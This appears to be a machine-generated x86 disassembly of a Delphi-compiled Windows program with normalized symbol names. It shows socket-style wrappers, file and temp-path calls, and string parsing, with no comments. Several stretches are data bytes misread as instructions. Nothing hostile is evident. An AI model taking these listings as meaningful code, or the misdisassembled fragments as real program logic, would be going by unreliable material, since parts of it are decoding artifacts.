mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_45f80c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46024c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404468
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_4041a0
or edx 0xffffffff
mov eax esi
call sub_45f80c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46029c
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_4045f4
mov eax [ ebx ]
call sub_404268
push eax
mov eax [ ebx ]
call sub_404468
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404468
mov edx eax
mov eax ebx
call sub_4041a0
pop ebx
retn
sub_4602e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_460300
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46038b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_403ffc
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460392
lea eax [ ebp - 0x1c ]
call sub_403fa8
retn
sub_46039c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_4140a8
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_413de8
add ebx 0x4
dec esi
jne r-xdata
sub_4603d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46046d
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460474
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_413f44
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_46047c
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402c64
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402c64
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402c64
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_4603d8
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_4603d8
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_4603d8
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46039c
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46039c
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46039c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_460594
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_4605b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402c64
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45fd18
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46061c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_46063c
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0xc ] eax
sub_46069c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_460769
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_403824
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40808c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460770
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
sub_460718
add [ 0xffffffff8b004607 ] bl
inc ebp
cld
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
call sub_403a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460770
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
sub_46078f
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_460899
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404fe4
xor eax eax
push ebp
push j_sub_4036f8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_4041a0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_405020
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4608a0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404fe4
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4041a0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_460863
mov eax [ ebp - 0x4 ]
call sub_403258
call sub_403a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4608a0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404fe4
retn
sub_4608c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_46095e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404468
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_45f80c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460965
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fcc
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_46096c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_460988
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_460a3e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_460a21
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460a28
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_460a50
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_460b13
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46126c
mov eax [ ebp - 0x8 ]
call sub_40808c
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46126c
mov eax [ ebp - 0xc ]
call sub_40808c
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46126c
mov eax [ ebp - 0x10 ]
call sub_40808c
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46126c
mov eax [ ebp - 0x14 ]
call sub_40808c
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b1a
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403fcc
retn
sub_460b38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460bc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_45f80c
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403ffc
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460bcd
lea eax [ ebp - 0x18 ]
call sub_403fa8
retn
sub_460bd8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460c66
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_45f80c
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403ffc
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460c6d
lea eax [ ebp - 0x18 ]
call sub_403fa8
retn
sub_460c78
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_460c98
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_460cf2
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460cf9
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_460d00
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_460d5a
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460d61
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_460d68
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_460d9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_460e3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_45f8e0
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408db8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403ffc
sub_460e4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_460e85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460e8c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_460ebc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_460ee1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460ee8
retn
sub_461118
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_461177
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_4045f4
mov eax [ ebx ]
call sub_404468
push eax
mov eax [ ebx ]
call sub_404268
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_4045f4
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_461020
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46117e
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_461184
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46124d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_4043b4
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407c00
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407c00
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_4045ac
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4044c8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403ffc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461254
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fcc
retn
push ebx
mov eax edi
call sub_404268
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4044c8
mov eax ebx
call sub_403fa8
jmp r-xdata
sub_46126c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_461184
mov eax esi
mov edx r-xdata
call sub_4043b4
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_4045ac
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4044c8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403ffc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404268
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4044c8
jmp r-xdata
mov eax ebx
call sub_403fa8
jmp r-xdata
sub_461313
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov esi [ edx ]
cli
inc ebx
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4613d7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4613de
retn
mov eax rw-data
call sub_40d250
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
call sub_403fa8
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe4
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a30
sub_4613e0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4614b3
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4614ba
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
lea eax [ ebp - 0x4 ]
call sub_461118
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ffc
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402d88
jne r-xdata
mov eax sub_40c414
mov [ rw-data ] eax
mov [ rw-data ] r-xdata
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd8
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ffc
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd8
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ffc
sub_461814
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_461834
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_461858
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a2c
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_461894
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_415bbc
sub_4618c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_415bbc
sub_4618f4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d48
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_461968
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46198d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461994
retn
sub_4619a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4619c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4619cc
retn
sub_4619d8
or [ eax ] eax
add [ eax ] al
xor al 0x47
add [ ebp + edi + 0x47 ] dh
add [ eax + 0x34 ] ah
inc edi
add [ ebp + edi + 0x47 ] dh
add [ esp + esi + 0x47 ] bl
add [ ebp + edi + 0x47 ] dh
add [ eax + 0x34 ] bl
inc edi
add [ ebp + edi + 0x47 ] dh
add [ esp + esi + 0x47 ] dl
add al bl
cmp eax 0x34500047
inc edi
add al dl
aas
inc edi
add [ esp + esi + 0x47 ] cl
add [ eax ] bl
cmp al 0x47
add [ eax + 0x34 ] cl
inc edi
add [ eax + 0x3e ] ah
inc edi
add [ esp + esi + 0x47 ] al
add [ eax + 0x5500473c ] bl
